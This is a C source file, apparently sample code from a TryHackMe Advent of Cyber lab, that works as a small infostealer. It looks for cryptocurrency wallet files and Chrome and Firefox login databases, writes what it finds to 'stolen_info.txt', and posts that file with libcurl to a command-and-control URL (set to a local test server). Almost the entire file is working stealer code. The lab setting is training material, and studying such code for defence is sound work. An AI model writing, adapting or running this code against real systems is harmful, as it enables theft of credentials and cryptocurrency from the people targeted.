// Sample code from THM AOC to find and exfiltrate info to C2
// TODO keep this warm

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <curl/curl.h>
#include <dirent.h>
#include <sys/stat.h>

#define INFO_FILE "stolen_info.txt"
#define C2_URL "http://127.0.0.1:9000/" //I define this to use with my python server script. You could it in my github PythonScripts ;)

// Function to check if a file exists
int file_exists(const char *path) {
    struct stat buffer;
    return (stat(path, &buffer) == 0);
}

// Function to search for wallet files
void search_for_wallets(FILE *fp) {
    const char *wallet_paths[] = { // eventually try another location
        "/home/user/.bitcoin/wallet.dat",
        "/home/user/.ethereum/keystore",
        "/home/user/.monero/wallet",
        "/home/user/.dogecoin/wallet.dat"
        // Add other paths for different wallets here
    };
    int i;
    fprintf(fp, "\n### Crypto Wallet Files ###\n");
    for (i = 0; i < sizeof(wallet_paths) / sizeof(wallet_paths[0]); i++) {
        if (file_exists(wallet_paths[i])) {
            fprintf(fp, "Found wallet: %s\n", wallet_paths[i]);
        }
    }
}

// Function to search for browser credential files (SQLite databases)
void search_for_browser_credentials(FILE *fp) {
    const char *chrome_path = "/home/user/.config/google-chrome/Default/Login Data"; // could by adapt for other user metadata files
    const char *firefox_path = "/home/user/.mozilla/firefox/*.default-release/logins.json";

    fprintf(fp, "\n### Browser Credential Files ###\n");
    if (file_exists(chrome_path)) {
        fprintf(fp, "Found Chrome credentials: %s\n", chrome_path);
    }
    if (file_exists(firefox_path)) {
        fprintf(fp, "Found Firefox credentials: %s\n", firefox_path);
    }
}

// Function to send the stolen info to a C2 server
void send_info_to_c2_server() {
    CURL *curl;
    CURLcode res;
    FILE *fp = fopen(INFO_FILE, "r");
    if (!fp) {
        perror("Failed to open info file");
        return;
    }

    // Read the contents of the file
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (file_size == 0) {
       printf("The file is empty\n");
       fclose(fp);
       return;
    }

    char *data = (char *)malloc(file_size + 1);  // +1 for the null terminator
    if (!data) {
        perror("Failed to allocate memory for file contents");
        fclose(fp);
        return;
    }

    fread(data, 1, file_size, fp);
    fclose(fp);

    // Send the contents to the  C2 server
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        curl_easy_cleanup(curl);
    }

    free(data);
}

int main() {

    // Create the info file
    FILE *fp = fopen(INFO_FILE, "w");
    if (fp == NULL) {
        perror("Failed to open file");
        return 1;
    }

    // Search for crypto wallets and browser credentials
    search_for_wallets(fp);
    search_for_browser_credentials(fp);
    fclose(fp);

    // Send stolen information to fake C2 server
    send_info_to_c2_server();

    return 0;
}
